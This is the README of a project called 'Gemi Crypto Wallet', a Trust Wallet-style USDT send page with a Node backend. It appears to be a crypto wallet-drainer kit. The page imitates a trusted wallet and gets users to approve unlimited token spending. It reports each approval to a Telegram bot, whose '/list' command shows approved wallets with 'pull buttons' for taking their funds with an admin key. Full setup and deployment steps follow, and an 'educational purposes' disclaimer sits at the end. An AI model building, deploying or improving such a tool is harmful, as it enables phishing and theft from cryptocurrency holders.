# Gemi Crypto Wallet

A Trust Wallet-style crypto send interface with backend integration for USDT transfers on BNB Smart Chain.

## Features

- 🎨 Modern Trust Wallet-inspired UI
- 📱 Mobile-responsive design
- 🔗 Web3 wallet integration (Trust Wallet, MetaMask)
- 💰 Real-time USDT balance fetching from BSC
- 📊 Crypto to INR conversion
- 🔔 Telegram bot notifications for wallet connections
- 🚀 Single popup approval flow
- ⚡ Backend API for transaction handling

## Prerequisites

- Node.js (v14 or higher)
- npm or yarn
- Telegram Bot Token
- Admin wallet with BNB for gas fees

## Installation

1. Clone the repository:
```bash
git clone <your-repo-url>
cd gemi
```

2. Install dependencies:
```bash
npm install
```

3. Configure environment variables:
```bash
cp .env.example .env
```

4. Edit `.env` file with your configuration:
```
TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
ADMIN_CHAT_ID=your_admin_chat_id_here
ADMIN_PRIVATE_KEY=your_admin_wallet_private_key_here
ADMIN_WALLET_ADDRESS=your_admin_wallet_address_here
PORT=3000
```

## Running the Application

### Development Mode
```bash
npm run dev
```

### Production Mode
```bash
npm start
```

The application will be available at `http://localhost:3000`

## Project Structure

```
gemi/
├── index.html          # Main HTML file
├── script2.js          # Frontend JavaScript (uses script2.js)
├── script.js           # Alternative frontend script
├── styles.css          # Styles for main interface
├── dashboard.html      # Dashboard page
├── dashboard.js        # Dashboard JavaScript
├── dashboard.css       # Dashboard styles
├── backend_server.js   # Node.js backend server
├── package.json        # Node.js dependencies
├── .env.example        # Environment variables template
└── .gitignore          # Git ignore rules
```

## API Endpoints

### POST /api/notify-approval
Notifies backend when user approves unlimited token spending.

**Request Body:**
```json
{
  "address": "0x...",
  "amount": 100,
  "walletName": "Trust Wallet"
}
```

### POST /api/notify-connection
Notifies backend when a wallet connects.

**Request Body:**
```json
{
  "chat_id": "123456789",
  "message": "Wallet connected message",
  "address": "0x...",
  "balance": 2.5
}
```

## Telegram Bot Commands

- `/list` - View all approved wallets with pull buttons

## Security Notes

⚠️ **Important Security Considerations:**

1. Never commit `.env` file to version control
2. Keep your admin wallet private key secure
3. Use environment variables for all sensitive data
4. Deploy backend to a secure server (Render, Heroku, etc.)
5. Use HTTPS in production
6. Limit admin wallet access and monitor transactions

## Deployment

### Frontend
The frontend can be deployed to:
- Netlify
- Vercel
- GitHub Pages
- Any static hosting service

### Backend - Railway Deployment (Recommended)

#### Step 1: Install Railway CLI
```bash
npm install -g @railway/cli
```

#### Step 2: Login to Railway
```bash
railway login
```

#### Step 3: Initialize Project
```bash
railway init
```

#### Step 4: Add Environment Variables
```bash
railway variables set TELEGRAM_BOT_TOKEN=your_bot_token
railway variables set ADMIN_CHAT_ID=your_chat_id
railway variables set ADMIN_PRIVATE_KEY=your_private_key
railway variables set ADMIN_WALLET_ADDRESS=your_wallet_address
```

#### Step 5: Deploy
```bash
railway up
```

#### Alternative: Deploy via Railway Dashboard
1. Go to [railway.app](https://railway.app)
2. Click "New Project" → "Deploy from GitHub repo"
3. Select your repository
4. Add environment variables in the Variables tab:
   - `TELEGRAM_BOT_TOKEN`: Your Telegram bot token
   - `ADMIN_CHAT_ID`: Your Telegram chat ID
   - `ADMIN_PRIVATE_KEY`: Your admin wallet private key
   - `ADMIN_WALLET_ADDRESS`: Your admin wallet address
5. Click "Deploy"

#### Alternative: Render / Heroku
The backend can also be deployed to:
- Render (recommended)
- Heroku
- DigitalOcean App Platform
- Any Node.js hosting service

Update `BACKEND_API_URL` in `script2.js` to match your deployed backend URL.

## Testing with USB Debugging

For testing on a real Android device:

1. Enable USB debugging on your device
2. Connect device via USB
3. Run the backend server locally
4. Access the app from your device using your computer's local IP:
   ```
   http://YOUR_COMPUTER_IP:3000
   ```

## License

MIT

## Disclaimer

This project is for educational purposes only. Always audit smart contracts and test thoroughly before using with real funds.
